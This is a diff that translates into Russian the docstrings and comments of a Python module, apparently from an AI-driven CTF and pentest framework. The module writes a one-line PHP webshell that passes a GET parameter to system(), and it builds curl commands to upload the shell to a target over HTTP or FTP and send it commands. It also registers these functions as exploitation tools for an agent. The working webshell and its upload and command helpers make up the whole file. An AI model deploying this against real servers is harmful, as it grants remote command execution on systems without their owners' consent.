@@ -1,20 +1,20 @@
 """
-PHP webshell and curl utilities for web exploitation
+PHP-вебшелл и утилиты curl для эксплуатации веб-приложений
 """
 
 
 def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
     """
-    Upload and generate a basic PHP webshell and uploads it via HTTP or FTP
+    Загружает и генерирует базовый PHP-вебшелл, отправляя его через HTTP или FTP
 
-    Args:
-        target_url: Target URL to upload shell to
-        port: Port number to use (default: 80 for HTTP, 21 for FTP)
-        protocol: Protocol to use - 'http' or 'ftp' (default: http)
-        ctf: CTF object to use for context
+    Аргументы:
+        target_url: Целевой URL для загрузки шелла
+        port: Номер порта (по умолчанию: 80 для HTTP, 21 для FTP)
+        protocol: Используемый протокол — 'http' или 'ftp' (по умолчанию: http)
+        ctf: Объект CTF для использования в контексте
 
-    Returns:
-        Tuple of (webshell content, upload command)
+    Возвращает:
+        Кортеж из (содержимое вебшелла, команда загрузки)
     """
     with open("shell.php", "w", encoding="utf-8") as f:
         f.write("""<?php system($_GET['cmd']); ?>""")
@@ -29,7 +29,7 @@ def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None)
     if protocol == "ftp":
         upload_cmd = f"curl -T shell.php ftp://{target_url}:{port}/"
     else:
-        # HTTP POST upload
+        # Загрузка через HTTP POST
         upload_cmd = f"curl -X POST http://{target_url}:{port} -F 'file=@shell.php'"
 
     return webshell, upload_cmd
@@ -37,15 +37,15 @@ def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None)
 
 def curl_webshell(url, command, cmd_param="cmd"):
     """
-    Sends command to PHP webshell via curl
+    Отправляет команду в PHP-вебшелл через curl
 
-    Args:
-        url: URL of the webshell
-        command: Command to execute
-        cmd_param: GET parameter name for command (default: cmd)
+    Аргументы:
+        url: URL вебшелла
+        command: Команда для выполнения
+        cmd_param: Имя GET-параметра для команды (по умолчанию: cmd)
 
-    Returns:
-        Command to execute with curl
+    Возвращает:
+        Команда для выполнения через curl
     """
     encoded_cmd = command.replace(" ", "+")
     return f"curl '{url}?{cmd_param}={encoded_cmd}'"
@@ -53,22 +53,22 @@ def curl_webshell(url, command, cmd_param="cmd"):
 
 def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
     """
-    Generates curl command to upload PHP webshell
+    Генерирует команду curl для загрузки PHP-вебшелла
 
-    Args:
-        url: Target URL for upload
-        filename: Name of shell file (default: shell.php)
-        ctf: CTF object to use for context
+    Аргументы:
+        url: Целевой URL для загрузки
+        filename: Имя файла шелла (по умолчанию: shell.php)
+        ctf: Объект CTF для использования в контексте
 
-    Returns:
-        Tuple of (webshell content, curl upload command)
+    Возвращает:
+        Кортеж из (содержимое вебшелла, команда загрузки curl)
     """
     shell = generate_php_webshell()
     curl_cmd = f"""curl -X POST {url} -F "file=@{filename}" """
     return shell, curl_cmd
 
 
-# --- Auto-register with ToolRegistry ---
+# --- Автоматическая регистрация в ToolRegistry ---
 from cai.tool_registry import TOOL_REGISTRY  # noqa: E402
 TOOL_REGISTRY.register("generate_php_webshell", generate_php_webshell, categories=['web', 'exploitation'])
 TOOL_REGISTRY.register("curl_webshell", curl_webshell, categories=['web', 'exploitation'])
